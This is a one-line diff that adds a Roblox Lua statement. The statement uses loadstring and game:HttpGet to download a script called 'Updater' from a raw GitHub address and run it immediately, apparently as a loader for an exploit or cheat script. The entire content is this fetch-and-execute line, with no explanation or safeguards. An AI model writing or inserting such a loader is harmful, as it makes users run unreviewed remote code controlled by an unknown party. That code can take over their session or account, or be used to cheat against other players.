@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/sanderxnewu/refs/heads/main/Updater'))()
